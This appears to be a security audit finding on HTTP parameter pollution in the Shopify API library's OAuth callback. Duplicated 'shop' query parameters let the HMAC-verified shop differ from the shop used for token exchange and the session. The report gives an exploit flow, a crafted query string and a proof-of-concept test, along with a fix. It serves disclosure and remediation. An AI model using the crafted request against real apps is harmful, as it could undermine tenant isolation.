### Title
HTTP Parameter Pollution in OAuth `callback()` allows the HMAC-validated `shop` to diverge from the `shop` used for token exchange/session creation - (File: `packages/apps/shopify-api/lib/auth/oauth/oauth.ts`)

### Summary
In `callback()`, the `shop` value used to build the token-exchange URL and the resulting `Session` is read via `query.get('shop')` (which returns the **first** occurrence of a duplicated query parameter), while the value that is actually HMAC-verified is derived from `Object.fromEntries(query.entries())` (which keeps the **last** occurrence of a duplicated key). Supplying a duplicated `shop` parameter lets an attacker make these two values diverge, so the shop that is cryptographically authenticated is not the shop the library subsequently acts on.

### Finding Description
`callback()` extracts the shop twice, from two different representations of the same `URLSearchParams` object: [1](#0-0) 

```
const query = new URL(...).searchParams;
const shop = query.get('shop')!;
```
`URLSearchParams.get()` returns the **first** value when a key is repeated.

Later, the object passed into `validQuery` (and thus into `validateHmac`) is built with: [2](#0-1) 

`Object.fromEntries(query.entries())` iterates all entries in order and assigns them onto the plain object, so for a duplicated key the **last** value wins and overwrites the first.

Inside `validateHmac` → `normalizeQuery` (`packages/apps/shopify-api/lib/utils/hmac-validator.ts`), when the input is already a plain object (not a `URLSearchParams` instance, which is the case here since `authQuery` was already converted by `Object.fromEntries`), the `admin` signator path performs **no deduplication or array check at all**: [3](#0-2) 

So the HMAC is computed/verified over the object's single `shop` field, which equals the **last** duplicated value.

Then the code used to actually reach Shopify's servers is built from `query.get('shop')` (the **first** value): [4](#0-3) 

```
const cleanShop = sanitizeShop(config)(query.get('shop')!, true)!;
const postResponse = await fetchRequestFactory(config)(
  `https://${cleanShop}/admin/oauth/access_token`, ...);
...
const session: Session = createSession({ ..., shop: cleanShop, ... });
```

Exploit flow: An attacker completes a normal, legitimate `begin()`/callback OAuth flow for their **own** store (`attacker-shop.myshopify.com`), obtaining a real, Shopify-issued `hmac` and `code` bound to `shop=attacker-shop.myshopify.com`. Before hitting the app's callback endpoint, they duplicate the `shop` query parameter, putting a different (e.g. victim's) shop value first and the original attacker-shop value last: `?shop=victim-shop.myshopify.com&shop=attacker-shop.myshopify.com&code=...&hmac=...&state=...&timestamp=...`. `validateHmac` verifies against `shop=attacker-shop.myshopify.com` (last value, matches the legitimately-issued HMAC) and succeeds, while `cleanShop`/session/logging use `shop=victim-shop.myshopify.com` (first value). `sanitizeShop` only checks the domain suffix, so any syntactically valid `*.myshopify.com` value is accepted regardless of whether it matches the HMAC-authenticated shop.

None of the existing checks catch this: `validateHmac`/`safeCompare` verify authenticity of *a* shop value, but not that it is the *same* shop value subsequently used; `sanitizeShop` only validates domain format, not consistency with the HMAC-verified value.

### Impact Explanation
This is a tenant-isolation/authenticity confusion bug: the shop that is cryptographically bound to the request (HMAC) is not the shop the library actually uses to request a token and construct the `Session` object (`shop: cleanShop`). In the library's own logic this breaks the invariant that "the shop used for the token exchange and resulting Session must be the exact HMAC-covered shop." In practice, full account takeover is additionally gated by Shopify's OAuth server rejecting an authorization `code` when redeemed against a shop different from the one that issued it, which would cause `postResponse.ok` to be `false` and the exchange to fail — this external check is outside this library's control. Within the scope of this library, the concrete, reproducible impact is: HMAC validation can succeed for one shop value while the shop used for the token-exchange request/URL and eventual session creation is a different, attacker-chosen value — a genuine parameter-pollution/authenticity-binding flaw, though downstream real-world exploitation depends on Shopify's server-side code-shop binding, which is not part of this codebase.

### Likelihood Explanation
The attacker only needs an unprivileged ability to run a normal OAuth flow for a store they control (any developer/merchant can do this) and to modify the query string of the redirect they receive before it reaches the app's callback endpoint (a request they fully control, e.g., via a proxy or manually constructed request to the app's `/callback` URL). No secret, MITM, or special app configuration is required — the divergence between `URLSearchParams.get()` (first-wins) and `Object.fromEntries()` (last-wins) is unconditional/default library behavior.

### Recommendation
Derive the `shop` used for `cleanShop`/session creation from the exact same normalized query object that was HMAC-verified (`authQuery.shop`), not from a separate call to `query.get('shop')`. Additionally, harden `normalizeQuery` for the `admin` signator to reject (or collapse deterministically, consistently with `.get()`) duplicated single-value parameters such as `shop`, `hmac`, `state`, and `timestamp`, mirroring the existing `appProxy` duplicate-rejection logic.

### Proof of Concept
```ts
// packages/apps/shopify-api/lib/auth/oauth/__tests__/oauth.test.ts

test('duplicate shop query param: HMAC-validated shop diverges from shop used for token exchange', async () => {
  const shopify = shopifyApi(testConfig());
  const attackerShop = 'attacker-shop.myshopify.io';
  const victimShop = 'victim-shop.myshopify.io';

  const beginResponse = await shopify.auth.begin({
    shop: attackerShop,
    isOnline: true,
    callbackPath: '/some-callback',
    rawRequest: request,
  });
  setCallbackCookieFromResponse(request, beginResponse, shopify.config.apiSecretKey);

  // Legit query/HMAC signed for attackerShop only
  const legitQuery: QueryMock = {
    shop: attackerShop,
    state: VALID_NONCE,
    timestamp: getCurrentTimeInSec().toString(),
    code: 'attacker auth code',
  };
  const validHmac = await generateLocalHmac(shopify.config)(legitQuery);

  // Attacker duplicates 'shop': victimShop first, attackerShop last (so
  // Object.fromEntries -> validateHmac sees attackerShop and passes,
  // but query.get('shop') returns victimShop first)
  const params = new URLSearchParams();
  params.append('shop', victimShop);
  params.append('shop', attackerShop);
  params.append('state', legitQuery.state as string);
  params.append('timestamp', legitQuery.timestamp as string);
  params.append('code', legitQuery.code as string);
  params.append('hmac', validHmac);
  request.url += `?${params.toString()}`;

  queueMockResponse(JSON.stringify({access_token: 'stolen-token', scope: ''}));

  const callbackResponse = await shopify.auth.callback({rawRequest: request});

  // Session ends up bound to victimShop even though HMAC only authenticated attackerShop
  expect(callbackResponse.session.shop).toEqual(victimShop);
});
```
Expected (buggy) result: `validQuery`/`validateHmac` succeeds (HMAC matches the `attackerShop`-only value taken from `Object.fromEntries`), yet `callbackResponse.session.shop` and the outgoing POST URL (`https://${victimShop}/admin/oauth/access_token`) are built from `victimShop`, demonstrating the shop-value confusion described above.

### Citations

**File:** packages/apps/shopify-api/lib/auth/oauth/oauth.ts (L143-147)
```typescript
    const query = new URL(
      request.url,
      `${config.hostScheme}://${config.hostName}`,
    ).searchParams;
    const shop = query.get('shop')!;
```

**File:** packages/apps/shopify-api/lib/auth/oauth/oauth.ts (L178-183)
```typescript
    const authQuery: AuthQuery = Object.fromEntries(query.entries());
    if (!(await validQuery({config, query: authQuery, stateFromCookie}))) {
      log.error('Invalid OAuth callback', {shop, stateFromCookie});

      throw new ShopifyErrors.InvalidOAuthError('Invalid OAuth callback.');
    }
```

**File:** packages/apps/shopify-api/lib/auth/oauth/oauth.ts (L194-217)
```typescript
    const cleanShop = sanitizeShop(config)(query.get('shop')!, true)!;

    const postResponse = await fetchRequestFactory(config)(
      `https://${cleanShop}/admin/oauth/access_token`,
      {
        method: 'POST',
        body: JSON.stringify(body),
        headers: {
          'Content-Type': DataType.JSON,
          Accept: DataType.JSON,
        },
      },
    );

    if (!postResponse.ok) {
      throwFailedRequest(await postResponse.json(), false, postResponse);
    }

    const session: Session = createSession({
      accessTokenResponse: await postResponse.json<AccessTokenResponse>(),
      shop: cleanShop,
      state: stateFromCookie,
      config,
    });
```

**File:** packages/apps/shopify-api/lib/utils/hmac-validator.ts (L118-131)
```typescript
function normalizeQuery(query: HmacQuery, signator: HMACSignator): AuthQuery {
  if (!(query instanceof URLSearchParams)) {
    if (signator === 'appProxy') {
      for (const key of APP_PROXY_SINGLE_VALUE_PARAMS) {
        if (Array.isArray(query[key])) {
          throw new ShopifyErrors.InvalidHmacError(
            `Query parameter "${key}" must not appear more than once.`,
          );
        }
      }
    }

    return query;
  }
```
